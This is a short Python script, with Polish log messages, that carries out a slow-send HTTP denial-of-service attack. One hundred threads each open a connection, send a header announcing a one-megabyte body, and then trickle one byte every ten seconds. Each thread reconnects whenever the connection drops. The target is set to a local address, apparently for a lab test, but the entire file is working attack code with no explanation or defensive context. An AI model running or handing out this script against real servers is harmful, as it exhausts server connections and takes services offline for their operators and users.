import socket
import time
import threading

target_host = "127.0.0.1"
target_port = 8080
path = "/heavy"
threads_count = 100 

def attack():
    while True: 
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4) 
            s.connect((target_host, target_port))

            header = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 1000000\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            s.send(header.encode())
            print(f"[*] [Wątek {threading.current_thread().name}] Połączono. Start slow send...")

            while True:
                s.send(b'a')
                time.sleep(10)
        except socket.error:
            print(f"[!] [Wątek {threading.current_thread().name}] Połączenie przerwane, restartuję...")
            time.sleep(1)
        finally:
            s.close()

if __name__ == "__main__":
    print(f"Uruchamiam atak na {target_host} przy użyciu {threads_count} wątków...")

    threads = []
    for i in range(threads_count):
        t = threading.Thread(target=attack, name=f"Worker-{i}")
        t.daemon = True 
        threads.append(t)
        t.start()
        time.sleep(0.1) 

    # Trzymamy główny wątek przy życiu
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Atak przerwany przez użytkownika.")
